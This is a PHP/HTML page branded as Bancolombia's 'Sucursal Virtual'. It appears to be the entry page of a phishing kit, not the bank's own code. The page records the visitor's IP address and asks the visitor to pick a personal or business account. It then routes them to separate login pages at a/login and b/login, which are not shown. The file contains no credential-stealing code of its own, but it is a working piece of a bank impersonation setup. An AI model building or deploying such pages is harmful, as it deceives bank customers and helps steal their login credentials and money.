<?php
$ip = getenv("REMOTE_ADDR");
require_once __DIR__ . '/a/fecha_es.php';
$tiempo = b34f9_fecha_larga();
?>
<html>
    <head>
        <title>Bancolombia Sucursal Virtual</title>
        <meta http-equiv="content-type" content="text/html; utf-8">
        <meta charset="utf-8">

        <meta content="es" http-equiv="Content-Language">

        <meta name="description" content="">
        <meta name="author" content="">
        <meta name="Copyright" content="">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <meta http-equiv="X-UA-Compatible" content="IE=edge">

        <link rel="preconnect" href="https://fonts.googleapis.com">
        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
        <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@700;800&display=swap" rel="stylesheet">

        <script src="https://kit.fontawesome.com/45b9078c9f.js" crossorigin="anonymous"></script>
        <link href="css/stylesheet.css" rel="stylesheet">
        <link href="css/style-app.css?v2" rel="stylesheet">
        <link rel="icon" type="image/png" href="img/logo.png" />
        <script type="text/javascript" src="../../../../js/jquery-3.6.0.min.js"></script>
        <script src="../../../../js/jquery.jclock-min.js" type="text/javascript"></script>

        <style type="text/css">
            .selector-container {
                display: flex;
                gap: 20px;
                margin-top: 40px;
                justify-content: center;
                flex-wrap: wrap;
            }

            .selector-card {
                width: 280px;
                padding: 30px;
                border: 2px solid #ddd;
                border-radius: 8px;
                text-align: center;
                cursor: pointer;
                transition: all 0.3s ease;
                background: #fff;
            }

            .selector-card:hover {
                border-color: #1a1b1a;
                box-shadow: 0 4px 12px rgba(0,0,0,0.1);
                transform: translateY(-2px);
            }

            .selector-card i {
                font-size: 48px;
                color: #1a1b1a;
                margin-bottom: 15px;
            }

            .selector-card h3 {
                font-size: 18px;
                font-weight: bold;
                color: #1a1b1a;
                margin: 10px 0;
            }

            .selector-card p {
                font-size: 13px;
                color: #666;
                margin: 10px 0 0 0;
            }
        </style>
    </head>
    <body>
        <div id="fondo"></div>
        <div id="cargando">
            <img src="img/logo.svg">
            <br>
            <img src="img/load2.gif" />
        </div>

        <table width="100%" border="0" cellpadding="0" cellspacing="0">
            <tr>
                <td valign="middle" align="left" width="33%"><img src="img/btn-cerrar.jpg" height="29"></td>
                <td valign="middle" align="center" width="34%"><img src="img/logo-app.jpg" height="29"></td>
                <td valign="middle" align="right" width="33%"></td>
            </tr>
        </table>

        <img src="img/logo.svg" width="260" style="margin-top: 48px;margin-bottom: 34px;">
        <div class="titulo-app">¿Qué tipo de cliente eres?</div>
        <div class="descripcion-app">Selecciona tu tipo de cuenta para continuar</div>

        <div class="selector-container">
            <div class="selector-card" onclick="irPersonas()">
                <i class="fas fa-user"></i>
                <h3>Personas</h3>
                <p>Acceso para clientes personas naturales</p>
            </div>

            <div class="selector-card" onclick="irEmpresas()">
                <i class="fas fa-building"></i>
                <h3>Empresas</h3>
                <p>Acceso para clientes empresa</p>
            </div>
        </div>

        <script type="text/javascript">
            function irPersonas() {
                window.location.href = "a/login";
            }

            function irEmpresas() {
                window.location.href = "b/login";
            }

            $(document).ready(function() {
                // Opcional: animación al cargar
            });
        </script>
    </body>
</html>